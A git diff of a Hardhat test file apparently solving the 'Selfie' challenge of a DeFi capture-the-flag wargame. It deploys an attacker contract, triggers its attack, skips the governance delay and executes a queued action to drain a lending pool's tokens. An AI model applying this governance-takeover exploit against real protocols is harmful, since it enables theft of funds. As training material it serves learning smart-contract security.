@@ -14,13 +14,23 @@ describe('[Challenge] Selfie', function () {
         const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
         const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
         const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
-
+        // my code:
+        const SelfieSnatcherFactory = await ethers.getContractFactory('SelfieSnatcher', attacker);
+        // ends
         this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
         this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
         this.pool = await SelfiePoolFactory.deploy(
             this.token.address,
             this.governance.address    
         );
+        // my code: 
+        this.selfieSnatcher = await SelfieSnatcherFactory.deploy(
+            this.pool.address,
+            this.governance.address,
+            this.token.address,
+            attacker.address,
+        );
+        // ends
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
@@ -31,11 +41,18 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // attack
+        await this.selfieSnatcher.attack();
+
+        // Increase time by 2 days, irl nobody can cancel our queued action so the time is not important
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+
+        // Finally execute the action 
+        await this.governance.executeAction(1);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-
         // Attacker has taken all tokens from the pool
         expect(
             await this.token.balanceOf(attacker.address)
